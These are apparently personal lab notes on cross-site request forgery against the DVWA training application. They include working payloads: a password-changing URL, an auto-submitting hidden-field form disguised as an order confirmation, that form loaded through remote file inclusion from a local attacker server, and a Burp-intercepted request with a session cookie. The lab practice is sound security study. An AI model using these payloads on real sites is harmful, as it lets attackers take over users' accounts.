CSRF via URL Parameter:
http://dvwa.local/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change HTTP/1.1"

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
CSRF via RFI:
http://dvwa.local/DVWA/vulnerabilities/fi/?page=http://192.168.48.128:8000/mysite.html

┌──(kali㉿host)-[/mnt/c/Users/user]
└─$ cat mysite.html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Auto-Submit CSRF</title>
</head>
<body onload="document.forms[0].Change.click();">

  <form action="http://dvwa.local/DVWA/vulnerabilities/csrf/?" method="GET">
    <h1>CLICK CHANGE TO CONFIRM YOUR ORDER</h1>
    <input type="hidden" autocomplete="off" name="password_new" value="newhacked">
    <input type="hidden" autocomplete="off" name="password_conf" value="newhacked">
    <input type="submit" value="Change" name="Change">
  </form>

</body>
</html>


┌──(kali㉿host)-[/mnt/c/Users/user]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
172.24.176.1 - - [07/May/2025 18:22:29] "GET /mysite.html HTTP/1.1" 200 -

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
CSRF via MITM:

1. Go to "http://dvwa.local/DVWA/vulnerabilities/csrf/" in your browser
2. Configure your Firefox proxy settings to 127.0.0.1:8080
3. Start Burp Suite in Windows and Turn on Intercept
4. Submit a password change and go to the intercepted request in Burp
5. Intercept the request in Burp, modify the value for password_new and password_conf, and forward the request.

GET /DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change HTTP/1.1
Host: dvwa.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://dvwa.local/DVWA/vulnerabilities/csrf/
Cookie: PHPSESSID=f88c4183d5744b5e3ceecc30970e5bdd; security=low
Upgrade-Insecure-Requests: 1
Priority: u=0, i

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
CSRF via Pharming:

Copy this part from the HTML code an paste it into a .txt file on your local system:

	<form action="#" method="GET">
			New password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password_new"><br />
			Confirm new password:<br />
			<input type="password" AUTOCOMPLETE="off" name="password_conf"><br />
			<br />
			<input type="submit" value="Change" name="Change">

		</form>


Change it to this:

	<form action="http://dvwa.local/DVWA/vulnerabilities/csrf/?" method="GET">
			<h1>CLICK CHANGE TO CONFIRM YOUR ORDER</h1>
			<input type="hidden" AUTOCOMPLETE="off" name="password_new" value= "hacked" >
			<input type="hidden" AUTOCOMPLETE="off" name="password_conf" value= "hacked">
			<input type="submit" value="Change" name="Change">

		</form>


Go to the file path (e.g. file:///C:/Users/user/mysite.html) and click "Change".
